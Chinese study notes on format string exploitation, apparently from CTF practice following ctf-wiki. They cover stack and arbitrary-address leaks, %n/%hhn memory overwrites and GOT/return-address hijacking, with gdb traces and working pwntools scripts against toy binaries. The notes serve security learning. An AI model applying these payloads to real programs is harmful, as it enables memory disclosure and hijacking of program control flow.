Breakpoint 1, __printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28   # 在第1个 printf 处断下
─────────────────────────────────────────[ stack ]──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp  # 返回地址
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s" # 格式化字符串的地址    printf的第 1 个参数  # 0x8048563
0xffffccf4│+0x08: 0x00000001      # a = 1     格式化字符串的第 1 个参数  printf的第 2 个参数
0xffffccf8│+0x0c: 0x22222222      # b = 0x22222222  格式化字符串的第 2 个参数  printf的第 3 个参数
0xffffccfc│+0x10: 0xffffffff      # c = -1    格式化字符串的第 3 个参数  printf的第 4 个参数
0xffffcd00│+0x14: 0xffffcd10  →  "%08x.%08x.%08x" # 输入的字符串的地址 s="%08x.%08x.%08x" # 格式化字符串的第 4 个参数  printf的第 5 个参数 
0xffffcd04│+0x18: 0xffffcd10  →  "%08x.%08x.%08x" # 下一个 printf 函数的格式化字符串 即下一个printf的第 1 个参数
0xffffcd08│+0x1c: 0x000000c2
> c # continue
00000001.22222222.ffffffff.%08x.%08x.%08x  # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出  s="%08x.%08x.%08x"
Breakpoint 1, __printf (format=0xffffcd10 "%08x.%08x.%08x") at printf.c:28 # 在第2个 printf 处断下
─────────────────────────────────────────[ stack ]────  # printf(s); 的栈
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  "%08x.%08x.%08x" # 格式化字符串的地址 printf的第 1 个参数 0xffffcd10
0xffffcd04│+0x08: 0xffffcd10  →  "%08x.%08x.%08x" # 栈上的 0xffffcd04 及其后的数值分别作为第1,2,3个参数按int型解析，分别输出
0xffffcd08│+0x0c: 0x000000c2                 # 被解析的第2个int型
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10 # 被解析的第3个int型
0xffffcd10│+0x14: "%08x.%08x.%08x"   ← $eax # "%08x.%08x.%08x" 的首地址
0xffffcd14│+0x18: ".%08x.%08x"
0xffffcd18│+0x1c: "x.%08x"
> c # continue # 输出以下内容后退出 [Inferior 1 (process 57077) exited normally]
ffffcd10.000000c2.f7e8b6bb  # 这里泄露的是栈上的内存
```

- 如果换成`%p.%p.%p`，则输入输出为：

```python
%p.%p.%p # 输入
00000001.22222222.ffffffff.%p.%p.%p # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出
0xfff328c0.0xc2.0xf75c46bb # printf(s); 的输出
```

- 并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的
- 获取**栈中被视为第 n+1 个参数的值**：(格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，相对于输出函数来说，是第 n+1 个参数)

```c
printf("%3$x"); // 获取对于printf函数来说，视为第4个参数的值  //  %2$s 将栈上第3个参数作为字符串输出
```
- 输入为`%3$x`时的栈，输出：
```assembly
$ gdb leakmemory
>  b printf
>  r
%3$x # 输入
────────────────────────────────────────[ stack ]──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s" # format string
0xffffccf4│+0x08: 0x00000001
0xffffccf8│+0x0c: 0x22222222
0xffffccfc│+0x10: 0xffffffff
0xffffcd00│+0x14: 0xffffcd10  →  "%3$x"
0xffffcd04│+0x18: 0xffffcd10  →  "%3$x"
0xffffcd08│+0x1c: 0x000000c2
>  r
00000001.22222222.ffffffff.%3$x # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的输出
─────────────────────────────────────────────────────[ stack ]──── # printf(s); 的栈
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  "%3$x" # 将会输出对应format string来说第3个参数，相对于printf来说是第4个参数
0xffffcd04│+0x08: 0xffffcd10  →  "%3$x"
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10 # 将会被输出的内容 !!! # printf's parameter 4  !!!!!!
0xffffcd10│+0x14: "%3$x"     ← $eax
0xffffcd14│+0x18: 0xffffce00  →  0x00000001
0xffffcd18│+0x1c: 0x000000e0
>  c  # 输出后退出 [Inferior 1 (process 57442) exited normally]
f7e8b6bb # 输出的内容为 0xffffcd0c│+0x10: 0xf7e8b6bb 即esp+0x10 为printf的第4个参数 # 确实获得 printf 第 4 个参数所对应的值 f7e8b6bb
```





##### 泄露任意地址的内存

- 上例中 s 是 main 函数的局部变量，所以读取到的内容在栈上。调用输出函数`printf`时，第一个参数的值其实就是格式化字符串format string的地址
- 当上例`leakmemory.c`的输入为"%s"，可以看到`printf`的栈上参数 1 和 2 均指向`%s`，第一个`%s`指的是`printf`的格式化字符串地址，而第二个`%s`则是格式化字符串的`%s`对应参数。亦即：第二个`%s`被作为参数传递给第一个作为格式化字符串使用的`%s`
```assembly
──────────────────────────────────[ stack ]──── # printf(s); 的栈 # 当上例 leakmemory.c 的输入为"%s"
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?) # 0xffffcd10: format string's address # 该地址存储 printf 的格式化字符串的地址
0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 ("%s"?) # char* (address) as format string's 1st parameter # 格式化字符串的第一个参数
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd10│+0x14: 0xff007325 ("%s"?)  ← $eax # string "%s" 0x25=% 0x73=s # 既被用作格式化字符串 也被用作格式化字符串的第一个参数
```

```c
printf("addr%k$s"); // 获取某个指定地址addr的内容的方法
// 假设格式化字符串相对函数调用为第k个参数 addr是个地址，高概率为不可见字符。 // k: 格式化字符串地址相对于 printf 第一个参数来说是第k个参数
```

- `printf("addr%k$s")`**原理**：`printf`的第一个参数为format string的地址，`addr`被存储在format string的开头。用`%k$s`控制`printf`解析对于第一个参数（即 存储format string地址的地址）来说第`k`个参数(即format string)，将其解析为字符串的地址。也就达到了将`addr`视作地址，输出`addr`上内容的目的。



- 确定该格式化字符串为第几个参数的方式：  `[tag]%p%p%p%p%p%p...`     重复某个字符的机器字长来作为tag(32bit ELF下为4byte char)，后面跟上若干`%p`输出栈上的内容，如果内容与tag重复，就有很大把握说明该地址是格式化字符串的地址

```bash
$ ./leakmemory     # [tag]%p%p%p%p%p%p... 方法确定 格式化字符串 是函数的第几个参数
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xffffd3a00xf7fcb4100x80491890x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x8007025(nil)0xf7ffd000(nil)
```

- `0x41414141`在输出的第五个参数，则为格式化字符串的第4个参数。若输入`%4$s`会造成segmentation fault，是因为尝试将`%4$s`表示的地址`0x73243425`进行解析。vmmap可以查看各个地址段的权限

```assembly
────────── stack ──── # 输入 AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 时 # printf(s); 的栈
0xffffd38c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
0xffffd390│+0x0004: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" # 0xffffd3a0 为 format string 的地址
0xffffd394│+0x0008: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
0xffffd398│+0x000c: 0xf7fcb410  →  0x080482b8  →  "GLIBC_2.0"
0xffffd39c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
0xffffd3a0│+0x0014: "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" # format string 所在的地址 # 相对于0xffffd390来说是第 4 个参数
0xffffd3a4│+0x0018: "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" .........
```



- 输出 scanf 地址的脚本，疑似由于某些额外的保护措施/gcc的影响，导致无法输出scanf的地址

```python
from pwn import *   # 分析 leakmemory.c 的脚本 可以输出 scanf 的地址 # 有效性存疑
context.log_level = "DEBUG"
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']  # __isoc99_scanf 的got表项地址
print("__isoc99_scanf_got: ", hex(__isoc99_scanf_got))  # __isoc99_scanf_got:  0x804c014
payload = p32(__isoc99_scanf_got) + b'%4$s' # scanf 的got表地址 + %4$s
print("payload:", payload) # payload: b'\x14\xc0\x04\x08%4$s'
# gdb.attach(sh) # [+] Waiting for debugger: Done
sh.sendline(payload) # Sent 0x9 bytes: 14 c0 04 08  25 34 24 73  0a  │····│%4$s│·│
sh.recvuntil(b'%4$s\n')
temp = sh.recv() # 按照原本脚本的意思 这里应该收到8 bytes 前4byte为__isoc99_scanf_got，后 4byte 为__isoc99_scanf_got上存储的内容
print("sh.recv(): ", temp, type(temp), len(temp)) # sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
print("hex(u32(temp)): ", hex(u32(temp))) # hex(u32(temp)):  0x804c014
temp = sh.recv()
# print(hex(u32(sh.recv()[4:8])))  # remove the first bytes of __isoc99_scanf@got
sh.interactive()
```

- 运行上面的脚本时的输出

```python
$ python leakmemory.py
[+] Starting local process './leakmemory' argv=[b'./leakmemory'] : pid 36823
[DEBUG] PLT 0x8049030 printf
[DEBUG] PLT 0x8049040 __libc_start_main
[DEBUG] PLT 0x8049050 __isoc99_scanf
[*] '/home/kali/CTF/pwn/leakmemory'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
__isoc99_scanf_got:  0x804c014
payload: b'\x14\xc0\x04\x08%4$s'
[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 36823
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./leakmemory" 36823']
[+] Waiting for debugger: Done
[DEBUG] Sent 0x9 bytes:
    00000000  14 c0 04 08  25 34 24 73  0a                        │····│%4$s│·│
    00000009
[DEBUG] Received 0x24 bytes:
    00000000  30 30 30 30  30 30 30 31  2e 32 32 32  32 32 32 32  │0000│0001│.222│2222│
    00000010  32 2e 66 66  66 66 66 66  66 66 2e 14  c0 04 08 25  │2.ff│ffff│ff.·│···%│
    00000020  34 24 73 0a                                         │4$s·│
    00000024
[DEBUG] Received 0x4 bytes:
    00000000  14 c0 04 08                                         │····│
    00000004
sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
hex(u32(temp)):  0x804c014
[*] Switching to interactive mode
[*] Process './leakmemory' stopped with exit code 0 (pid 36823)
[*] Got EOF while reading in interactive
```
- 上述脚本运行时，会启动gdb，在gdb中下断点，continue，查看栈的变化：

```assembly
gef➤  b printf   # gdb窗口出来后 首先下断点   # Breakpoint 1 at 0xf7dd8060: file printf.c, line 32.
gef➤  c #Continuing.
──────────────────────────────── stack ──── # printf("%08x.%08x.%08x.%s\n", a, b, c, s); 的栈; int a = 1, b = 0x22222222, c = -1;
0xfff7022c│+0x0000: 0x080491d6  →  <main+100> add esp, 0x20      ← $esp
0xfff70230│+0x0004: 0x0804a00b  →  "%08x.%08x.%08x.%s\n" # format string
0xfff70234│+0x0008: 0x00000001
0xfff70238│+0x000c: 0x22222222
0xfff7023c│+0x0010: 0xffffffff
0xfff70240│+0x0014: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
0xfff70244│+0x0018: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
0xfff70248│+0x001c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
gef➤  c  # Continuing.
────────────────────────────────────────── stack ────  # printf(s); 的栈
0xfff7023c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
0xfff70240│+0x0004: 0xfff70250  →  0x0804c014  →  ...# ...与下一行一样 # format string # 0x804c014 是 scanf 的got表项地址
0xfff70244│+0x0008: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
0xfff70248│+0x000c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
0xfff7024c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
0xfff70250│+0x0014: 0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax> # format string所在位置
0xfff70254│+0x0018: "%4$s"
0xfff70258│+0x001c: 0xf7fb6900  →  0xf7fb6980  →  0x00000000
────────────────────────────────────────── trace ────
[#0] 0xf7dd8060 → __printf(format=0xfff70250 "\024\300\004\b%4$s")
[#1] 0x80491e5 → main()
```

- `0x0804c014`是 `scanf` 的got表项地址，可以直接由ELF文件得出，`0xf7dd9100`则是`scanf`的真实地址，由脚本的payload利用格式化字符串漏洞得出。（按ctfwiki描述，脚本输出的应该是`0xf7dd9100`，实际脚本输出为`0x0804c014`）

作为对照，放上ctf-wiki中展示的printf(s); 的栈：

```assembly
─────────────────────────────────────[ stack ]──── # ctf-wiki 中# printf(s); 的栈
0xffbbf8dc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp
0xffbbf8e8│+0x0c: 0x000000c2
0xffbbf8ec│+0x10: 0xf765c6bb  →  <handle_intel+107> add esp, 0x10
0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  <__isoc99_scanf+0> push ebp  ← $eax
0xffbbf8f4│+0x18: "%4$s"
0xffbbf8f8│+0x1c: 0x00000000
```

- 并不是所有的偏移机器字长的整数倍，都可以直接用相应参数来获取，有时，需要对输入的格式化字符串进行填充，使得想要打印的地址内容的地址位于机器字长整数倍的地址处，类似于：
- `[padding][addr]`

#### 覆盖内存

> 上面一节讲的是 泄露内存，是读取内存，这一节将介绍怎么写内存，即覆盖内存

- `%n`: 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量
- 覆盖某个地址的变量，基本上是构造类似如下的payload:

```c
...[overwrite addr]....%[overwrite offset]$n      // e.g. p32(c_addr) + b'%012d%6$n'
```

- ... 表示填充内容，overwrite addr 表示要覆盖的地址，overwrite offset 表示要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数

1. 确定覆盖地址
2. 确定相对偏移
3. 进行覆盖

```c
#include <stdio.h> // 示例程序 overwrite.c // gcc -fno-stack-protector -m32 -o -no-pie overwrite overwrite.c
int a = 123, b = 456; // 后续在覆盖任意地址内存中，想要覆盖的变量
int main() {
    int c = 789; // 0x315 // 后续在覆盖栈内存中，想要覆盖的变量
    char s[100];
    printf("%p\n", &c); // 程序这里已经输出了c的地址
    scanf("%s", s);
    printf(s); // 漏洞利用点
    if (c == 16) { // 覆盖栈内存 一节中想要命中的判断
        puts("modified c.");
    } else if (a == 2) { // 覆盖任意地址内存 覆盖为小数字 一节中想要命中的判断
        puts("modified a for a small number.");
    } else if (b == 0x12345678) { // 覆盖任意地址内存 覆盖为大数字 一节中想要命中的判断
        puts("modified b for a big number!");
    }
    return 0;
}
```

##### 覆盖栈内存

- `p32(c_addr)`为4B(4 char)，是c的地址，为凑齐16B (16 char)，需要用`%012d`来再输出多12个字符，然后用`%6$n`将输出的字符个数，即16，写到变量c去。`%6$n`的 6 表示format string相对于栈第一个参数来说是第6个参数(即`printf`的第7个参数)，可以通过gdb调试分析漏洞利用点`printf`的栈帧得到

```python
from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
def forc():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print(hex(c_addr))  # 0xffd582bc # 注意这个地址并非每次运行都一样
    payload = p32(c_addr) + b'%012d' + b'%6$n'  # b'\x8c\x01\x84\xff%012d%6$n'
    print("payload: ", payload) # [ addr of c, %012d%6$n ]
    # gdb.attach(sh)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()
context.log_level = "DEBUG"
forc()
```

- 下方输出表明：payload控制`printf(s);`输出16 char，并且控制程序命中`if (c == 16)`，即将 c 的值覆盖为16

```bash
$ python overwrite.py  # 运行上述脚本后，终端的输出
[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 131771
[DEBUG] Received 0xb bytes:           b'0xffd582bc\n'   # printf("%p\n", &c);
0xffd582bc   # print(hex(c_addr)) c 的地址
b'\xbc\x82\xd5\xff%012d%6$n'  # [addr of c, %012d%6$n ] 
[*] running in new terminal: /usr/bin/gdb -q  "./overwrite" 131771
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./overwrite" 131771']
[+] Waiting for debugger: Done  # gdb.attach(sh)
[DEBUG] Sent 0xe bytes:  # sh.sendline(payload)
    00000000  bc 82 d5 ff  25 30 31 32  64 25 36 24  6e 0a        │····│%012│d%6$│n·│
    0000000e
[DEBUG] Received 0x1c bytes:  # sh.recv() # 第一行共16bytes 说明payload成功控制输出16个字符
    00000000  bc 82 d5 ff  2d 30 30 30  30 32 37 38  34 36 38 30  │····│-000│0278│4680│
    00000010  6d 6f 64 69  66 69 65 64  20 63 2e 0a               │modi│fied│ c.·│
    0000001c
b'\xbc\x82\xd5\xff-00002784680modified c.\n'  ......  # print(sh.recv())  # modified c 表明 c 已经被更改为 16
```

- `printf(s);` 时的栈：

```assembly
───────────── stack ────  # printf(s); 时的栈
0xffd5823c│+0x0000: 0x080484d7  →  <main+76> add esp, 0x10       ← $esp
0xffd58240│+0x0004: 0xffd58258  →  0xffd582bc  →  0x00000315 # 0xffd58258 addr of format string
0xffd58244│+0x0008: 0xffd58258  →  0xffd582bc  →  0x00000315 # 0xffd582bc 为 c 的地址
0xffd58248│+0x000c: 0xf7f07410  →  0x0804829c  →  "GLIBC_2.0"
0xffd5824c│+0x0010: 0x00000001
0xffd58250│+0x0014: 0x00000000
0xffd58254│+0x0018: 0x00000001
0xffd58258│+0x001c: 0xffd582bc  →  0x00000315 # 0xffd58258 为format string起始地址 0xffd582bc为c的地址 # 0x315=789 c的原始值 
────────────── trace ────
[#0] 0xf7d5b060 → __printf(format=0xffd58258 "\274\202\325\377%012d%6$n")
[#1] 0x80484d7 → main()
gef➤  hexdump byte 0xffd58258 32 # 以bytes显示格式化字符串所在地址存储的内容，展示32byte
0xffd58258     bc 82 d5 ff 25 30 31 32 64 25 36 24 6e 00 d5 ff    ....%012d%6$n...
0xffd58268     02 00 00 00 66 8d f2 f7 34 80 04 08 00 00 00 00    ....f...4.......
```

- `0xffd58258`为格式化字符串format string的首地址，`0xffd58258`上的前4byte又是变量c的地址`0xffd582bc``
- `%6$n`将输出的字符数(16)存储到format string的第6个参数(`0xffd58258`)所存的整型指针(c的地址`0xffd582bc`)上。效果：把c的值覆盖为16



##### 覆盖任意地址内存

> 修改 data 段的变量为：1. 一个小数字(小于机器字长的数字)；2. 一个大数字

- 这一节及下一节将要实现：
  1. 将全局变量 a 覆盖为2。利用payload `aa%k$nbb[addr]`
  2. 将全局变量 b 覆盖为 0x12345678。利用`%6$hhn`分多部分覆盖



- 将全局变量a覆盖为2的方法：`aa%8$nbb[addr]`。由前面的分析，format string相对于`printf`第 1 个参数来说是第 6 个参数，而现在`aa%8`占据了第6个参数，`$nbb`占据了第7个参数，所以`[addr]`就变成了第8个参数。同理，可以使用`aa%9$nbbcccc[addr]`... 这里以4为倍数，用b来凑数对齐，是因为程序是32bit程序

```cpp
aa%k$nbb[addr]  // tips: 该例说明地址不一定要放在format string开头
```

- a的数量取决于想将[addr]覆盖为多少，b的数量则取决于机器字长(32/64 bit)，k 取决于 aa%k$nbb 总长度与原本 format string 是第几个参数

```python
from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
def fora():
    sh = process('./overwrite')
    a_addr = 0x0804A024 # 该地址通过IDA静态分析得到，a是已初始化全局变量，在.data段，不在堆栈上
    payload = b'aa%8$nbb' + p32(a_addr) # aa%8$nbb[addr] # aa输出两个字符，%8$n
    sh.sendline(payload)
    print(sh.recv()) # 0xff9ac76c\naabb$\xa0\x04\x08modified a for a small number.\n
    sh.interactive()
context.log_level = "DEBUG"
fora()
```

```bash
$ python overwrite.py # 运行上述脚本
[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 2581307
[DEBUG] Sent 0xd bytes:
    00000000  61 61 25 38  24 6e 62 62  24 a0 04 08  0a           │aa%8│$nbb│$···│·│ # payload: aa%8$nbb[addr]
    0000000d
[DEBUG] Received 0x32 bytes:
    00000000  30 78 66 66  39 61 63 37  36 63 0a 61  61 62 62 24  │0xff│9ac7│6c·a│abb$│ # recv: printf("%p\n", &c); aabb
    00000010  a0 04 08 6d  6f 64 69 66  69 65 64 20  61 20 66 6f  │···m│odif│ied │a fo│ # 0804A024 为全局变量 a 的地址
    00000020  72 20 61 20  73 6d 61 6c  6c 20 6e 75  6d 62 65 72  │r a │smal│l nu│mber│ # modified a for a small number.
    00000030  2e 0a                                               │.·│                  # 说明命中了 else if (a == 2) 分支
    00000032
b'0xff9ac76c\naabb$\xa0\x04\x08modified a for a small number.\n'   .........
```



##### 用 hh / h 分块覆盖

>  本节将全局变量 b 覆盖为 0x12345678。注意本节默认已经得到了fmt str 地址相对于printf第 1 个参数为第 6 个参数

- `hh` 对于整数类型，`printf`期待一个从`char`提升的`int`尺寸的整型参数。`$hhn`会把输出字符数存在一`char`地址上，即覆盖指针指向的地址上的 1Byte
- `h`  对于整数类型，`printf`期待一个从`short`提升的`int`尺寸的整型参数。`$hn`会把输出字符数存在一`short`地址上，即覆盖指针指向的地址上的 2Byte

在 x86 和 x64 的体系结构中，变量的存储格式为以**小端**存储，即最低有效位存储在低地址。即希望按照如下方式覆盖（左边为地址，右边为覆盖内容）：

```python
0x0804A028 0x78 # 该地址为全局变量 b 的地址(占4B) 由IDA分析得出
0x0804A029 0x56
0x0804A02a 0x34
0x0804A02b 0x12
```
- 故可构造如下payload，其中padx用于控制后面的`'%6$hhn'`写入的数字是多少
```python
p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$hhn'+pad2+'%7$hhn'+pad3+'%8$hhn'+pad4+'%9$hhn'
```

- 在程序中需要对pad的大小进行计算，如果pad大小应为x，则使用`%xc`输出x个字符，如果当前已输出字符数过大，则再输出过量字符，以`0xff`为上界溢出

```python
from pwn import *  # 将 overwrite.c 中的全局变量 b 覆盖为 0x12345678
def fmt(prev, word, index): # 构造 padx + '%k$hhn'
    # prev: 前一个写入的数字[0, 0xff]
    # word: 将要写入的数字[0, 0xff]  # 利用类似 %kc / %5c 补充 k / 5 个字符
    # index: 该数字将要写入的地址存在第 index 个参数(相对于fmt str指针来说)
    fmtstr = b""
    if(prev < word):  # 前一个数字 比 将要写入的数字 小
        result = word - prev  # 追加输出相差的字符数 word - prev 个
        fmtstr = b"%" + bytearray(str(result), "ascii") + b"c" # 构造 %xc 输出 x 个char
    elif(prev == word):  # 前一个数字 和 将要写入的数字 相等，不需要追加输出字符
        pass  # 直接跳到构造 %k$hhn 的步骤，写入的数字与前一个相同
    else:  # prev > word # 前一个数字 比 将要写入的数字 大
        result = 256 + word - prev  # 以 0xff 为上限溢出
        fmtstr = b"%" + bytearray(str(result), "ascii") + b"c" # 构造 %xc 输出 x 个char
    fmtstr += b"%" + bytearray(str(index), "ascii") + b"$hhn"  # 构造 %k$hhn
    return fmtstr

def fmt_str(offset, size, addr, target): # 构造整个payload 
    # offset: 要覆盖的地址最初的偏移; size:机器字长; addr: 将要覆盖的地址; target: 要覆盖为的目的变量值
    payload = b""
    for i in range(4):
        if(size == 4):
            payload += p32(addr + i)  # 32bit 程序
        else:
            payload += p64(addr + i)  # 64bit 程序
    print(payload.hex())  # 28a0040829a004082aa004082ba00408 # 此时payload内容为4个地址
    prev = len(payload)  # 0x10 # 4个32bit的地址 4*4B = 0x10 B
    for i in range(4):
        # 具体传参: 0x10 0x78 0x6; 0x78 0x56 0x7; 0x56 0x34 0x8; 0x34 0x12 0x9
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

def forb(): # exploit
    sh = process('./overwrite')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)  # 0x0804A028：全局变量b的地址，IDA分析可得
    print("payload:", payload, "\npayload:", payload.hex())
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

context.log_level = "DEBUG"
forb()
```

- 上方脚本的运行结果如下: 

```bash
$ python overwrite.py # 将 overwrite.c 中的全局变量 b 覆盖为 0x12345678
[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 2582229
28a0040829a004082aa004082ba00408 # 0804A028 为全局变量 b 的地址
payload: b'(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn'
payload: 28a0040829a004082aa004082ba00408253130346325362468686e253232326325372468686e253232326325382468686e253232326325392468686e
[DEBUG] Sent 0x3d bytes:
    00000000  28 a0 04 08  29 a0 04 08  2a a0 04 08  2b a0 04 08  │(···│)···│*···│+···│
    00000010  25 31 30 34  63 25 36 24  68 68 6e 25  32 32 32 63  │%104│c%6$│hhn%│222c│
    00000020  25 37 24 68  68 6e 25 32  32 32 63 25  38 24 68 68  │%7$h│hn%2│22c%│8$hh│
    00000030  6e 25 32 32  32 63 25 39  24 68 68 6e  0a           │n%22│2c%9│$hhn│·│
    0000003d
[DEBUG] Received 0x33a bytes:
    00000000  30 78 66 66  65 31 33 37  66 63 0a 28  a0 04 08 29  │0xff│e137│fc·(│···)│
    00000010  a0 04 08 2a  a0 04 08 2b  a0 04 08 20  20 20 20 20  │···*│···+│··· │    │
    00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000080  20 20 98 20  20 20 20 20  20 20 20 20  20 20 20 20  │  · │    │    │    │
    00000090  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000160  10 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │·   │    │    │    │
    00000170  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000230  20 20 20 20  20 20 20 20  20 20 20 20  20 20 01 20  │    │    │    │  · │
    00000240  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000310  20 20 20 20  20 20 20 20  20 20 20 20  00 6d 6f 64  │    │    │    │·mod│
    00000320  69 66 69 65  64 20 62 20  66 6f 72 20  61 20 62 69  │ifie│d b │for │a bi│
    00000330  67 20 6e 75  6d 62 65 72  21 0a                     │g nu│mber│!·│
    0000033a
b'0xffe137fc\n(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08                                                                                                       \x98                                                                                                                                                                                                                             \x10                                                                                                                                                                                                                             \x01                                                                                                                                                                                                                             \x00modified b for a big number!\n'
```

> 也可以利用 `%n` 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用`%hhn` 则不会有这样的问题，因为这样只会修改相应地址的一个字节



### hijack GOT

> 劫持got表

由于下述两个原因，可以修改某个libc函数的got表项内容为另一个libc函数的地址，以此控制程序。e.g. 修改printf的got表项为system函数的地址，

1. 目前的 C 程序中，libc 中的函数是通过 GOT 表来跳转的
2. 在没有开启 RELRO 保护时，每个 libc 的函数对应的 GOT 表项可以被修改的

cases:

- `hijack_got_fmt_str_CCTF_2016_pwn3`: 利用`printf(s)`这样的漏洞，获取`puts`真实地址，得到libc版本和`system`地址，覆盖`puts@got`为`system`



### hijack retaddr

- 利用格式化字符串漏洞劫持程序的返回地址到想要执行的地址

cases:

- `fmt_str_hijack_retaddr_sangebaimao_pwnme_k0`: 输入用户名密码，用户名密码在栈上，相邻，用户名输入返回地址，密码用`%2218d%8$hn`来改变返回地址的值



### fmt str on Heap







---

## Glibc Heap

> Glibc Heap利用

- 对于不同的应用来说，由于内存的需求各不相同等特性，因此目前堆的实现有很多种: 

```python
dlmalloc  – General purpose allocator
ptmalloc2 – glibc  # 以 glibc 中堆的实现为主进行介绍 glibc-2.3.x. 之后，glibc 中集成了ptmalloc2
jemalloc  – FreeBSD and Firefox
tcmalloc  – Google
libumem   – Solaris
```

在 glibc 内部有精心设计的数据结构来管理heap。与堆相应的数据结构主要分为

- 宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。
- 微观结构，用于具体处理堆的分配与回收中的内存块。

### malloc_chunk

**chunk**: 称由 malloc 申请的内存为 chunk。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中

